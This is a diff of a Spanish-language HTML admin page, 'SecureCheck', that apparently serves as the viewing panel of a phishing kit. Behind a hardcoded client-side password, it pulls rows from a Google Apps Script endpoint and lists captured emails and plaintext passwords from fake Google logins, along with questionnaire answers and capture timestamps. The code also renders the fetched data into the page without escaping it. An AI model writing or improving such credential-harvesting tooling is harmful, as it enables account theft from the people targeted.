@@ -3,104 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard SecureCheck - Control Central</title>
+    <title>Panel de Control - SecureCheck</title>
     <style>
-        #contenido-panel { display: none; }
-        body { margin: 0; padding: 20px; font-family: 'Segoe UI', sans-serif; background: #0b141d; color: #e2e8f0; }
-        .container { max-width: 1100px; margin: auto; }
-        .header-panel { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1e293b; padding-bottom: 20px; margin-bottom: 30px; }
-        h1 { color: #38bdf8; margin: 0; font-size: 24px; }
-        .table-wrapper { background: #15202b; border-radius: 12px; overflow: hidden; border: 1px solid #1e293b; }
-        table { width: 100%; border-collapse: collapse; min-width: 800px; }
-        th { background: #1e293b; color: #38bdf8; padding: 15px; text-align: left; font-size: 13px; text-transform: uppercase; }
-        td { padding: 15px; border-bottom: 1px solid #1e293b; font-size: 14px; }
-        .pass-cell { color: #4ade80; font-family: 'Courier New', monospace; font-weight: bold; background: rgba(74, 222, 128, 0.1); padding: 4px 8px; border-radius: 4px; }
-        .loading { padding: 40px; text-align: center; color: #94a3b8; font-style: italic; }
-        .btn-refresh { background: #38bdf8; color: #0b141d; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; }
-        .btn-refresh:hover { background: #7dd3fc; }
+        :root {
+            --bg: #0f172a;
+            --card: #1e293b;
+            --primary: #38bdf8;
+            --accent: #a78bfa;
+            --text: #f1f5f9;
+            --border: #334155;
+        }
+
+        body { 
+            margin: 0; 
+            padding: 20px; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: var(--bg); 
+            color: var(--text); 
+        }
+
+        .container { max-width: 1200px; margin: auto; }
+
+        /* Login Screen */
+        #login-screen {
+            display: flex; justify-content: center; align-items: center; height: 80vh;
+        }
+        .login-box {
+            background: var(--card); padding: 40px; border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3); text-align: center; width: 300px;
+        }
+        input {
+            width: 100%; padding: 10px; margin: 15px 0; border-radius: 6px;
+            border: 1px solid var(--border); background: #0f172a; color: white; box-sizing: border-box;
+        }
+        button {
+            width: 100%; padding: 10px; background: var(--primary); border: none;
+            color: #0f172a; font-weight: bold; border-radius: 6px; cursor: pointer;
+        }
+
+        /* Dashboard */
+        #panel-content { display: none; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
+        h1 { color: var(--primary); margin: 0; }
+        
+        .table-container {
+            background: var(--card); border-radius: 12px; overflow-x: auto;
+            border: 1px solid var(--border);
+        }
+        table { width: 100%; border-collapse: collapse; min-width: 900px; }
+        th { background: #1e293b; padding: 15px; text-align: left; color: var(--primary); border-bottom: 2px solid var(--border); }
+        td { padding: 15px; border-bottom: 1px solid var(--border); font-size: 14px; }
+        
+        .badge {
+            padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold;
+        }
+        .badge-google { background: rgba(56, 189, 248, 0.2); color: #38bdf8; }
+        .badge-form { background: rgba(167, 139, 250, 0.2); color: #a78bfa; }
+        
+        .pass-text { font-family: monospace; color: #fbbf24; font-weight: bold; }
+        .refresh-btn { background: transparent; border: 1px solid var(--primary); color: var(--primary); width: auto; padding: 5px 15px; }
     </style>
 </head>
 <body>
 
-<div class="container" id="contenido-panel">
-    <div class="header-panel">
-        <h1>Dashboard Global SecureCheck</h1>
-        <button class="btn-refresh" onclick="cargarRegistros()">Actualizar Datos</button>
+<div class="container">
+    <div id="login-screen">
+        <div class="login-box">
+            <h2>Acceso Admin</h2>
+            <input type="password" id="admin-pass" placeholder="Contraseña">
+            <button onclick="verificarAcceso()">Entrar</button>
+        </div>
     </div>
-    
-    <div class="table-wrapper">
-        <table>
-            <thead>
-                <tr>
-                    <th>Usuario Detectado</th>
-                    <th>Contraseña Capturada</th> 
-                    <th>Riesgo</th>
-                    <th>Fecha de Captura</th>
-                </tr>
-            </thead>
-            <tbody id="tabla">
-                <tr><td colspan="4" class="loading">Iniciando conexión con el servidor...</td></tr>
-            </tbody>
-        </table>
+
+    <div id="panel-content">
+        <div class="header">
+            <h1>Dashboard de Capturas</h1>
+            <button class="refresh-btn" onclick="cargarDatos()">Actualizar Datos</button>
+        </div>
+
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Origen</th>
+                        <th>Correo / Empresa</th>
+                        <th>Contraseña / Detalles Cuestionario</th>
+                        <th>Fecha y Hora</th>
+                    </tr>
+                </thead>
+                <tbody id="tabla-datos">
+                    </tbody>
+            </table>
+        </div>
     </div>
 </div>
 
 <script>
-    // Credenciales de acceso al panel
-    const adminUser = "secure";
-    const adminPass = "Linares2025.";
-
-    // --- DEBES PEGAR AQUÍ LA URL DE TU SCRIPT DE GOOGLE ---
     const webAppUrl = "https://script.google.com/macros/s/AKfycbzaoOqKcF_TawLruyEebZuBhGahZigayFC3eFYeIzvZqU5T7UWVm7nnBvwa2zS-jkyZ/exec";
 
-    // Función de autenticación al cargar la página
-    function autenticar() {
-        const u = prompt("Usuario de Administrador:");
-        const p = prompt("Contraseña de Administrador:");
-
-        if (u === adminUser && p === adminPass) {
-            document.getElementById("contenido-panel").style.display = "block";
-            cargarRegistros();
+    function verificarAcceso() {
+        const pass = document.getElementById("admin-pass").value;
+        if (pass === "Linares2025.") {
+            document.getElementById("login-screen").style.display = "none";
+            document.getElementById("panel-content").style.display = "block";
+            cargarDatos();
         } else {
-            alert("Acceso denegado.");
-            window.location.href = "index.html"; 
+            alert("Acceso denegado");
         }
     }
 
-    // Función para descargar los datos de Google Sheets
-    async function cargarRegistros() {
-        let tabla = document.getElementById("tabla");
-        tabla.innerHTML = "<tr><td colspan='4' class='loading'>Descargando datos desde la nube...</td></tr>";
+    async function cargarDatos() {
+        const tbody = document.getElementById("tabla-datos");
+        tbody.innerHTML = "<tr><td colspan='4' style='text-align:center'>Cargando base de datos...</td></tr>";
 
         try {
-            const respuesta = await fetch(webAppUrl);
-            const filas = await respuesta.json(); // Obtiene el JSON de la nube
-            tabla.innerHTML = "";
+            const response = await fetch(webAppUrl);
+            const data = await response.json();
+            tbody.innerHTML = "";
 
-            if (filas.length === 0) {
-                tabla.innerHTML = "<tr><td colspan='4' class='loading'>No hay registros en la base de datos.</td></tr>";
-                return;
-            }
+            // Invertimos para que lo más reciente salga arriba
+            data.reverse().forEach(fila => {
+                // fila[0]=Usuario, fila[1]=Pass, fila[2]=Tipo, fila[3]=Fecha
+                const esLogin = fila[2] === "LOGIN_GOOGLE";
+                const badgeClass = esLogin ? "badge-google" : "badge-form";
+                const label = esLogin ? "LOGIN GOOGLE" : "CUESTIONARIO";
 
-            // Invertimos el orden para mostrar lo más nuevo primero
-            filas.reverse().forEach(r => {
-                const colorRiesgo = r[2] === "ALTO" ? "#f87171" : "#fbbf24";
-                tabla.innerHTML += `
+                tbody.innerHTML += `
                     <tr>
-                        <td>${r[0]}</td>
-                        <td><span class="pass-cell">${r[1]}</span></td>
-                        <td style="color: ${colorRiesgo}; font-weight: bold;">${r[2]}</td>
-                        <td>${r[3]}</td>
-                    </tr>`;
+                        <td><span class="badge ${badgeClass}">${label}</span></td>
+                        <td>${fila[0] || "---"}</td>
+                        <td><span class="${esLogin ? 'pass-text' : ''}">${fila[1] || "---"}</span></td>
+                        <td style="color: #94a3b8">${fila[3] || "N/A"}</td>
+                    </tr>
+                `;
             });
         } catch (error) {
-            console.error(error);
-            tabla.innerHTML = "<tr><td colspan='4' class='loading' style='color:#f87171;'>Error de conexión: Revisa si la URL de Google es correcta.</td></tr>";
+            tbody.innerHTML = "<tr><td colspan='4' style='text-align:center; color: #f87171'>Error al conectar con la base de datos</td></tr>";
         }
     }
-
-    // Ejecutar autenticación al abrir
-    window.onload = autenticar;
 </script>
+
 </body>
 </html>
